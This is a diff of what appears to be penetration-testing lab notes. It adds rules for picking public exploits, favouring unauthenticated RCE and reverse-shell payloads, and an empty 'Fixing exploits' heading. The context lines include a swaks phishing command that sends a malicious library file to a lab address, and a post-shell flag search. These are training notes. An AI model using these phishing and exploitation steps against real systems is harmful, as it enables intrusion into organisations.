@@ -113,7 +113,12 @@
 
       On RDP Windows Machine> Right click PC > Map Network Drive > http://<KALI>:8888/
       ```  
-    - Linux <> Kali  
+    - Linux <> Kali
+  - Selecting [exploit](https://www.exploit-db.com/) rules
+    - Priority
+      - match service + version, unauthenticated exploit, RCE, exploit in python/bash, exploit with shellcode/reversell, exploit available in 'searchsploit'
+    - Non-priority
+      - DoS, requires authentication, need compilation, PoC without reverse shell, MSF module, written in unfamiliar language like perl/Java
 
 ## Methodology 
 
@@ -1228,7 +1233,10 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
   - email phishing attack (target IP)  
     `sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com -ap --attach @config.Library-ms --server 192.168.158.199 --body @body.txt --header "Subject: Problems" --suppress-data`
   - netcat reverse shell received: `gci C:\ -Filter flag.txt -Recurse -ea SilentlyContinue`
-    
+
+### Fixing exploits  
+- 
+
 ### Password Attacks  
 - 16.1.1 SSH and RDP
   **SSH** guess password
